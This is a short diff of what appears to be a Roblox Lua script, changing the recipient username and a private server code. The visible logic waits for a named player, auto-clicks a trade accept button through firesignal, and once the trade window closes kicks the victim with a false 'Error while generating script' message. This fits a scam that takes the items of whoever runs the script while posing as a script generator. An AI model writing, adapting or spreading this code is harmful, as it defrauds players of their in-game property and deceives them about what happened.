@@ -7,7 +7,7 @@ repeat wait() until char ~= nil
 if not game:IsLoaded() then
 		game.Loaded:Wait()
 	end
-local plrtoinvite = "opaososa"
+local plrtoinvite = "browsqq"
 print("Started")
 if game:GetService("Players"):FindFirstChild(plrtoinvite) then
     print("Executing")
@@ -96,7 +96,7 @@ end
 end)
 
 
-print("Done")
+
 local GUI = Scgui
 pcall(function(s,f)
     
@@ -259,7 +259,7 @@ firesignal(acc.MouseButton1Click)
 repeat wait(1) local gui = plr.PlayerGui:FindFirstChild("TradeGUI") until gui == nil
 plr:Kick("Error while generating script, please rejoin")
 elseif game.Workspace:FindFirstChild("CamParts") then
-local servercode = "KF4X5T2yeG"
+local servercode = "IMXBtFcbCi"
 wait(1)
 local args = {
   [1] = servercode
